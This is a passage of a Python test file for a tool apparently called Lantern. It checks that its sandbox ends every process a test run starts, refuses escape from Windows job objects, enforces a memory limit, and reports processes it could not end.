    pid = add(_project(tmp_path, QUIET))
    code, job = call(base, f"/api/projects/{pid}/trace", "POST", {"command": " ".join(PYTEST), "confirm": True})
    assert code == 202, job
    done = wait(base, job["id"], timeout=120)
    r = done["result"]
    assert done["status"] == "done" and r["ran"] is False and r["unavailable"] == _jail.REASONS["guard"], done
    assert r["cancelled"] is False and r["returncode"] is None and r["observed"] == 0
    assert not any("PLANTED-RAN" in x for x in done["log"]), done["log"]
    monkeypatch.undo()                                                                         # the safe twin: the same request, the guard in place
    monkeypatch.setenv("LANTERN_SANDBOX", "subprocess")
    code, job = call(base, f"/api/projects/{pid}/trace", "POST", {"command": " ".join(PYTEST)})
    r = wait(base, job["id"], timeout=120)["result"]
    assert r["ran"] is True and r["unavailable"] is None and r["cancelled"] is False and r["returncode"] == 0


def test_a_test_run_started_from_the_apps_terminal_stops_the_same_way(app_with, tmp_path, sweep):
    from test_server import call, wait
    base, add = app_with
    pid = add(_project(tmp_path, STARTS + "\ndef test_never_ends():\n    start()\n    time.sleep(300)\n"))
    code, started = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["trace", "--", *PYTEST]})
    assert code == 202 and started["job"]["can_stop"] is True, started
    jid, end, pids = started["job"]["id"], time.time() + 120, []
    while not pids and time.time() < end:
        pids = _started(call(base, f"/api/jobs/{jid}")[1]["log"])
        time.sleep(0.1)
    sweep.extend(pids)
    assert len(pids) >= 2
    assert call(base, f"/api/jobs/{jid}/stop", "POST", {})[0] == 200
    done = wait(base, jid, timeout=120)
    assert done["status"] == "done" and done["error"] is None and done["result"] == {"cancelled": True, "not_ended": []}, done
    assert _still_there(_must_end(pids)) == [], "a process the tests started outlived the Stop"


@only_linux
def test_the_app_is_told_what_could_not_be_ended(app_with, tmp_path, monkeypatch):
    """The look for what is left keeps finding one process, as it would for one that cannot be ended. The safe
    twins are every other test of the app here: their `not_ended` is empty."""
    from test_server import call, wait
    base, add = app_with
    monkeypatch.setattr(sandbox, "_KILL_WAIT", 0.3)
    monkeypatch.setattr(_jail, "in_session", lambda sid: [4242])
    monkeypatch.setattr(_jail, "end_session", lambda sid: None)
    pid = add(_project(tmp_path, QUIET))
    code, job = call(base, f"/api/projects/{pid}/trace", "POST", {"command": " ".join(PYTEST), "confirm": True})
    assert code == 202, job
    done = wait(base, job["id"], timeout=120)
    r = done["result"]
    assert done["status"] == "done" and r["returncode"] == 0 and r["ran"] is True, done
    assert r["not_ended"] == ["1 process(es) this run started could not be ended"], r
    assert any(x == "sandbox: 1 process(es) this run started could not be ended" for x in done["log"]), done["log"]


# ---------------------------------------------------------------------------- Windows itself (run by CI's Windows job)
@only_windows
def test_windows_the_real_job_ends_a_detached_grandchild_at_the_wall_clock(tmp_path, sweep):
    code = ("import subprocess, sys, time\n"
            "p = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(300)'], "
            "creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)\n"
            "print('STARTED', p.pid, flush=True)\ntime.sleep(300)\n")
    lines = []
    rc, _out, timed_out = sandbox._stream([sys.executable, "-c", code], tmp_path, dict(os.environ), 6, lines.append,
                                          job=sandbox._windows_job)
    pids = _started(lines)
    sweep.extend(pids)
    assert rc is None and timed_out and pids, lines
    assert _still_there(pids) == [], "a detached grandchild outlived the job"
    assert not any("still in the job" in x or "did not end" in x for x in lines), lines


@only_windows
def test_windows_a_process_cannot_leave_the_job(tmp_path, sweep):
    code = ("import subprocess, sys, time\n"
            "try:\n"
            "    p = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(300)'], creationflags=0x01000000)\n"   # CREATE_BREAKAWAY_FROM_JOB
            "    print('STARTED', p.pid, flush=True)\n"
            "except OSError as e:\n"
            "    print('REFUSED', e.winerror, flush=True)\n")
    lines = []
    rc, _out, _timed_out = sandbox._stream([sys.executable, "-c", code], tmp_path, dict(os.environ), 60, lines.append,
                                           job=sandbox._windows_job)
    pids = _started(lines)
    sweep.extend(pids)
    assert rc == 0, lines
    assert any(x.startswith("REFUSED") for x in lines) or _still_there(pids) == [], lines


@only_windows
def test_windows_no_test_runs_when_the_process_cannot_be_put_in_the_job(tmp_path, monkeypatch):
    repo = _project(tmp_path, QUIET)

    def refuse(self, pid):
        raise winjob.JobError("AssignProcessToJobObject", 5)
    monkeypatch.setattr(winjob.Job, "take", refuse)
    lines = []
    with pytest.raises(sandbox.Unavailable) as e:
        sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=120)
    assert "AssignProcessToJobObject" in str(e.value) and "Windows error 5" in str(e.value)
    assert not any("PLANTED-RAN" in x or "passed" in x for x in lines), lines   # made suspended, ended before it ran


@only_windows
def test_windows_the_tests_run_inside_a_job_with_the_memory_limit(tmp_path):
    """Asked of Windows from inside the tests: is this process in a job, what is the job's limit for each process,
    and is 3 GB (more than the 2 GB a process there may have) refused."""
    repo = _project(tmp_path, '''
import ctypes
from ctypes import wintypes

class IO(ctypes.Structure):
    _fields_ = [(n, ctypes.c_ulonglong) for n in "abcdef"]

class BASIC(ctypes.Structure):
    _fields_ = [("a", ctypes.c_longlong), ("b", ctypes.c_longlong), ("LimitFlags", wintypes.DWORD),
                ("c", ctypes.c_size_t), ("d", ctypes.c_size_t), ("e", wintypes.DWORD), ("f", ctypes.c_size_t),
                ("g", wintypes.DWORD), ("h", wintypes.DWORD)]

class EXT(ctypes.Structure):
    _fields_ = [("Basic", BASIC), ("Io", IO), ("ProcessMemoryLimit", ctypes.c_size_t), ("j", ctypes.c_size_t),
                ("k", ctypes.c_size_t), ("l", ctypes.c_size_t)]

def test_in_a_job():
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    k32.GetCurrentProcess.restype = wintypes.HANDLE
    k32.IsProcessInJob.argtypes = [wintypes.HANDLE, wintypes.HANDLE, ctypes.POINTER(wintypes.BOOL)]
    k32.QueryInformationJobObject.argtypes = [wintypes.HANDLE, ctypes.c_int, ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p]
    inside = wintypes.BOOL(0)
    assert k32.IsProcessInJob(k32.GetCurrentProcess(), None, ctypes.byref(inside))
    info = EXT()
    assert k32.QueryInformationJobObject(None, 9, ctypes.byref(info), ctypes.sizeof(info), None), ctypes.get_last_error()
    try:
        big = bytearray(3 << 30)
        took = "given" if len(big) else "empty"
    except MemoryError:
        took = "refused"
    print("IN-JOB", inside.value, hex(info.Basic.LimitFlags), info.ProcessMemoryLimit, took, flush=True)
''')
    lines = []
    r = sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=120)
    said = next((x.split() for x in lines if x.startswith("IN-JOB")), None)
    assert r["returncode"] == 0 and said, r["output_tail"]
    assert said[1] == "1" and said[4] == "refused", said
    if sys.prefix == sys.base_prefix:
        # the job Windows names from inside is the nearest one: Lantern's, unless this Python is a virtual
        # environment's, whose python.exe puts the real interpreter in a job of its own inside Lantern's
        assert int(said[2], 16) & 0x2100 == 0x2100 and int(said[3]) == 2 << 30, said
